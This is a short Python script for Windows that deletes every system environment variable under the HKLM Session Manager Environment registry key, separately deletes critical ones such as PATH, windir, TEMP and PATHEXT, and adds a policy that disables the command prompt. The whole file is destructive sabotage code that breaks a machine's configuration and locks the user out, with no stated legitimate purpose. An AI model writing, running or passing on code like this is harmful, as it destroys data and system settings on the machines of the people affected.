#!/usr/bin/python
#coding:utf-8
import os, sys, time, winreg

# FUNCTION TO DELETE A REG ENVIRONMENT IN THE REGISTER
def delenv():
    aKey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",0, winreg.KEY_ALL_ACCESS)
    for keys in range(0, 1024):
        try:
            keyname = winreg.EnumValue(aKey, keys)
            key, value, id = (keyname)
            cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(key)
            os.system(cmd)
        except OSError:
            pass
# FUNCTION TO DELETE A SPECIAL REG ENVIRONMENT IN THE REGISTER
def delSpecRules():
    regs = ['TEMP', 'USERNAME', 'windir', 'PATHEXT', 'OS', 'PATH', 'PSModulePath']
    for reg in regs:
        cmd = '/windows/system32/reg.exe delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v %s /f' %(reg)
        os.system(cmd)
############## (NOT IMPLEMENTED)
# DISABLE CMD
def noCmd():
    nocmd = "REG add HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f"
    os.system(nocmd)
# FUNCTION TO DELETE A SPECIFIC VALUE INTO REGISTER
def delWindir():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment',0, winreg.KEY_SET_VALUE)
    winreg.DeleteKey(key, 'windir')
    winreg.CloseKey(key)
